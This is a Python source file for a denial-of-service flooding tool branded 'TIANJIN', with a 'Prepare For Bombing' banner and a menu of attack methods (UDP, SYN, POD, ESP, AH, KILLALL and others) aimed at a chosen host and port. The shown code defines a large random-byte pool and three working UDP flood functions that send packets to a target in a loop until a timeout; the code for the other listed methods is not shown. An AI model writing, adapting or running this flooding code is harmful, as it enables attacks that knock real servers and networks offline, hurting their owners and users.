import os
import random
import socket, atexit
import sys
import threading, struct
import time
import smtplib, imghdr
import sys
import webbrowser
from getpass import getpass
try:
    from random import randbytes
except ImportError:
    pass
import requests
from colored import attr, bg, fg

lock = threading.Lock()

class colors:
    yellow1 = fg(94)
    yellow2 = fg(130)
    yellow3 = fg(172)
    yellow4 = fg(220)
    yellow5 = fg(221)
    yellow6 = fg(229)
    yellow7 = fg(226)
    orange1 = fg(94)
    orange2 = fg(136)
    orange3 = fg(172)
    orange4 = fg(202)
    orange5 = fg(208)
    orange6 = fg(209)
    orange7 = fg(214)
    red1 = fg(52)
    red2 = fg(88)
    red3 = fg(124)
    red4 = fg(160)
    red5 = fg(196)
    red6 = fg(1)
    red7 = fg(9)
    white = fg(231)
global pool
pool = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"]
udp = False
ahh = False
udpv2 = False
esp = False
udpv3 = False
podv2 = False
methods = """\033[91m
╔═══════════════════════════════════════════════════════════════════════════╗
║                     \033[00mDDoS METHODS\033[91m                                          ║
║═══════════════════════════════════════════════════════════════════════════║
║ \u001b[33mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m           |\033[00m UDP ATTACK\033[91m              ║
║ \u001b[33mUDPv2 <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m          |\033[00m UDPv2 ATTACK\033[91m            ║
║ \u001b[33mUDPv3  <HOST> <PORT> <TIMEOUT> <SIZE> <MSG>  \033[91m   |\033[00m UDPv3 ATTACK\033[91m            ║
║ \u001b[33mPOD  <HOST> <TIMEOUT>   \033[91m                        |\033[00m POD ATTACK\033[91m              ║
║ \u001b[33mREP  <HOST> <TIMEOUT>   \033[91m                        |\033[00m REP ATTACK\033[91m              ║
║ \u001b[33mESP  <HOST> <TIMEOUT>   \033[91m                        |\033[00m ESP ATTACK\033[91m              ║
║ \u001b[33mSYN  <HOST> <PORT> <DURATION> \033[91m                  |\033[00m SYN ATTACK\033[91m              ║
║ \u001b[33mAH  <HOST> <TIMEOUT>   \033[91m                         |\033[00m AH ATTACK\033[91m               ║
║ \u001b[33mKILLALL  <HOST> <TIMEOUT>   \033[91m                    |\033[00m KILLALL ATTACK\033[91m          ║
╚═══════════════════════════════════════════════════════════════════════════╝\033[00m
"""
info = """\u001b[00m[\u001b[33mTIANJIN\u001b[00m]  \u001b[33mMade By WPA7, \033[91mMost Thanks To Ecstasy For Creating the UDPv2, UDPv3 Methods.\u001b[0m
"""

banner = """████████╗██╗░█████╗░███╗░░██╗░░░░░██╗██╗███╗░░██╗
\033[91m╚══██╔══╝██║██╔══██╗████╗░██║░░░░░██║██║████╗░██║\033[00m
░░░██║░░░██║███████║██╔██╗██║░░░░░██║██║██╔██╗██║
\033[91m░░░██║░░░██║██╔══██║██║╚████║██╗░░██║██║██║╚████║\033[00m
░░░██║░░░██║██║░░██║██║░╚███║╚█████╔╝██║██║░╚███║
\033[91m░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚═╝╚═╝░░╚══╝
╔═══════════════════════════════════════════════════╗
║\033[00m憶竹臆 [ \033[91m+ \033[00m] \033[91mPrepare For Bombing \033[00m[ \033[91m+ \033[00m] 園ポず ず影 \033[91m║
╚═══════════════════════════════════════════════════╝\n"""

def udpvone(ip,prt):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    global timeout
    global udp
    global attack
    global host
    global port
    global tm
    global duration
    tm = time.time()
    timeout = time.time() + float(duration)
    host = socket.gethostbyname(socket.gethostname())
    counter = 0
    global bite
    with lock:
        bite = ""
        while counter < pkt_size and udp:
            bite += "".join(random.sample(pool, 1))
            counter += 1
        bite = bite.encode("ascii", "ignore")
    while udp and attack and time.time() < timeout:
        s.sendto((bite), (ip,prt))
    udp = False
def udpvtwo(prt, ip):
    global timeout
    global udpv2
    global attack
    global host
    global port
    global duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byteee = b""
    timeout = time.time() + float(duration)
    while udpv2 and attack and time.time() < timeout:
        with lock:
            byteee = "".join(random.sample(pool, pkt_size))
            byteee = str.encode(byteee)
        s.sendto((byteee), (ip, prt))
    udpv2 = False

def udpvthree(prt, ip, tosend_):
    global timeout
    global udpv3
    global attack
    global host
    global port
    global duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + float(duration)
    while udpv3 and attack and time.time() < timeout:
        s.sendto((tosend_), (ip, prt))
    udpv3 = False

